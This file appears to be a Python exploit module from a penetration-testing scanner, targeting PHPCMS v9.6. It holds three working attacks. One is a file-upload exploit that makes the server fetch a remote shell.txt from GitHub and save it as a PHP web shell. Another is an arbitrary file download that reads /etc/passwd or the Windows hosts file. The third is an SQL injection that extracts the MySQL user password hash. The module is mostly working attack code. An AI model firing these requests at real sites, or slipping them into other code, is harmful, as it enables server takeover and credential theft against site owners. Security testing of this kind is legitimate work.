# -*- coding:UTF-8 -*-
from lib.util.exprequest import ExpRequest
from lib.util.output import Output
import lib.util.globalvar as GlobalVar
import prettytable as pt
import requests
import re
"""
import lib.util.globalvar as GlobalVar
from lib.clasetting import ysoserial_payload,Dnslog
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class phpcms():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
        self.timeout = env.get('timeout')

    def CVE_PHPcms_1(self):
        appName = 'phpcms'
        pocname = 'CVE_PHPcms_1'
        method = "post"
        info = "[upload]"
        path = "/index.php?m=member&c=index&a=register&siteid=1"
        data = "siteid=1&modelid=2&username=testxxx&password=testxxxxx&email=test@texxxst.com&info[content]=<img src=https://raw.githubusercontent.com/SecWiki/CMS-Hunter/master/phpcms/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/shell.txt?.php#.jpg>&dosubmit=1"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                request = exprequest.post(self.url + path, data=data, headers=headers)
                imgPath = re.findall(r'&lt;img src=(.*)&gt', request.text)
                if len(imgPath):
                    return output.echo_success(method, info+' path: '+imgPath[0])
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def CVE_PHPcms_2(self):
        appName = 'phpcms'
        pocname = 'CVE_PHPcms_2'
        method = 'post'
        info = '[dowload]'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output) 
        try:
            r = requests.get(self.url + '/Index.php', verify=False)
            if r.status_code == 200:
                os = 'WINDOWS'
            else:
                os = 'LINUX'

            s = requests.Session()
            r = s.get(self.url +'/index.php?m=wap&c=index&a=init&siteid=1', verify=False)
            cookie_siteid =  r.headers['set-cookie']
            cookie_siteid = cookie_siteid[cookie_siteid.index('=')+1:]

            if os == 'WINDOWS':
                url = self.url + '/index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dc:Windows/System32/drivers/etc/host%26f%3Ds%3%25252%2*70C'
            else:
                url = self.url + '/index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D/etc/passw%26f%3Dd%3%25252%2*70C'  

            post_data = {'userid_flash':cookie_siteid}

            r = s.post(url, post_data, verify=False)
            cookie_att_json = ''
            for cookie in s.cookies:
                if '_att_json' in cookie.name:
                    cookie_att_json = cookie.value
            
            r = s.get(self.url + '/index.php?m=content&c=down&a=init&a_k=' + cookie_att_json, verify=False)
            
            if 'm=content&c=down&a=download&a_k=' in r.text:
                start = r.text.index('download&a_k=')
                end = r.text.index('" class="xzs')
                download_url = r.text[start+13:end]
                download_url = self.url + '/index.php?m=content&c=down&a=download&a_k=' + download_url
                r = s.get(download_url, verify=False)

                if os == 'WINDOWS': # windows hosts file
                    if 'HOSTS file' in r.text:
                        return output.echo_success(method, info)
                else:
                    if 'root:x:0:0' in r.text:
                        return output.echo_success(method, info)
            return output.fail()
        except Exception as error:
            return output.error_output(str(error))

    def PHPCMS_v96_sqli_BaseVerify(self):
        appName = 'phpcms'
        pocname = 'PHPCMS_v96_sqli_BaseVerify'
        method = "post"
        info = "[sql]"
        path = "/index.php?m=wap&c=index&a=init&siteid=1"
        headers = {
            "Content-Type":"application/x-www-form-urlencoded", 
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                tmp_cookie = {}
                req = requests.get(self.url+path, headers=headers, timeout=self.timeout, verify=False)
                for cookie in req.cookies:
                    tmp_cookie = cookie.value
                
                post_data = {
                    "userid_flash":tmp_cookie
                }
                url_suffix = self.url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id="\
                "%*27%20and%20updatexml%281%2Cconcat%280x7e%2C%28select%20SUBSTRING%28password,30%29%20from%20mysql.user%20limit%200,1%29%29%2C0x7e%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"

                req2 = requests.post(url_suffix, data=post_data, headers=headers, timeout=self.timeout, verify=False)
                for cookie in req2.cookies:
                    tmp_cookie = cookie.value

                vulnurl = self.url + "/index.php?m=content&c=down&a_k="+str(tmp_cookie)

                req3 = requests.get(vulnurl, headers=headers, timeout=self.timeout, verify=False)
                if r"XPATH syntax error" in req3.text:
                    return output.echo_success(method, info)
                return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    Expphpcms = phpcms(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(Expphpcms, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(phpcms):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(Expphpcms, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)